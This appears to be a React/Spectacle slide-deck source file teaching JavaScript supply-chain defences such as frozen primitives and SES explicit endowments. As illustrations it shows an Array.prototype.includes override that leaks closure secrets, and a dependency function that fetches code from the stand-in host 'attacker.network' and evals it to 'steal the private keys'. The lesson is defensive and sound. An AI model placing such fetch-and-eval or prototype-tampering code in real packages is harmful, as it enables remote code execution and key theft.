import React from 'react';
import { Slide, CodePane } from 'spectacle';
import ActionSlide from './action-slide'

// ignore this - to please the linter
function getRandomNumber () {}

const frozenPrimsCodeExamples = [
  (function(){
    const secrets = [getRandomNumber(), getRandomNumber(), getRandomNumber()]
    function checkSecret (guess) {
      return secrets.includes(guess)
    }
  }),
  // -
  (function(){
    let checkSecret
    (function(){
      const secrets = [getRandomNumber(), getRandomNumber(), getRandomNumber()]
      checkSecret = (guess) => {
        return secrets.includes(guess)
      }
    })()

    checkSecret(123)
  }),
  // 1
  (function(){
    let checkSecret
    (function(){
      const secrets = [getRandomNumber(), getRandomNumber(), getRandomNumber()]
      let attempts = 0
      checkSecret = (guess) => {
        attempts++
        if (attempts > 5) throw new Error('No more guesses!')
        return secrets.includes(guess)
      }
    })()

    checkSecret(123)
    checkSecret(42)
    checkSecret(19)
  }),
  // 2
  (function(){
    let checkSecret
    (function(){
      const secrets = [getRandomNumber(), getRandomNumber(), getRandomNumber()]
      let attempts = 0
      checkSecret = (guess) => {
        attempts++
        if (attempts > 5) throw new Error('No more guesses!')
        return secrets.includes(guess)
      }
    })()

    let secrets

    // overwrite what "[].includes" does
    Array.prototype.includes = function () {
      secrets = this
    }
    checkSecret(123)
    checkSecret(secrets[0])
  }),
].map(fnToCodeString)

function fnToCodeString(fn) {
  return fn.toString().split('\n').slice(1,-1).join('\n')
}

export class FrozenPrimitivesExample extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    const { slideActionIndex } = this.state
    return (
      <ActionSlide
        transition={['slide']}
        bgColor="primary"
        onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
        slideActionMax={frozenPrimsCodeExamples.length-1}
        >
        <CodePane
          lang="js"
          source={frozenPrimsCodeExamples[slideActionIndex]}
          textSize={20}
        />
      </ActionSlide>
    )
  }
}

export class FrozenPrimitivesFix extends React.Component {
  render () {
    return (
      <Slide>
        <CodePane
          lang="js"
          source={(`\n// prevent modifications to Array\nObject.freeze(Array.prototype)\n\n`)}
          textSize={40}
        />
      </Slide>
    )
  }
}

// ignore, for linter
function lookupEnsName () {}
function formatEnsName () {}

const explicitEndowmentsCodeExamples = [
  // -
  (async function(){
    const address = '0xabcd...'
    const ensNameBuffer = await lookupEnsName(address)
    const result = formatEnsName(ensNameBuffer)
  }),
  // -
  (async function(){
    function formatEnsName (ensNameBuffer) {
      return 'ens:' + ensNameBuffer.toString('utf8')
      // steal the private keys
      (async function () {
        const payload = await fetch('https://attacker.network')
        eval(payload)
      })()
    }
  }),
].map(fnToCodeString)


export class ExplicitEndowmentsExample extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    const { slideActionIndex } = this.state
    return (
      <ActionSlide
        transition={['slide']}
        bgColor="primary"
        onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
        slideActionMax={explicitEndowmentsCodeExamples.length-1}
        >
        <CodePane
          lang="js"
          source={explicitEndowmentsCodeExamples[slideActionIndex]}
          textSize={20}
        />
      </ActionSlide>
    )
  }
}


// ignore, for linter
function sesEval () {}
let code, endowments, moduleSource, moduleExports, location

const explicitEndowmentsFixCodeExamples = [
  // -
  (function(){
    sesEval(code, endowments)
  }),
  // -
  (function(){
    sesEval(moduleSource, { fetch, location })
  }),
  (`
    with (endowments) {
      eval(code)
    }
  `),
].map(fnToCodeString)

export class ExplicitEndowmentsFix extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    const { slideActionIndex } = this.state
    return (
      <ActionSlide
        transition={['slide']}
        bgColor="primary"
        onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
        slideActionMax={explicitEndowmentsFixCodeExamples.length-1}
        >
        <CodePane
          lang="js"
          source={explicitEndowmentsFixCodeExamples[slideActionIndex]}
          textSize={40}
        />
      </ActionSlide>
    )
  }
}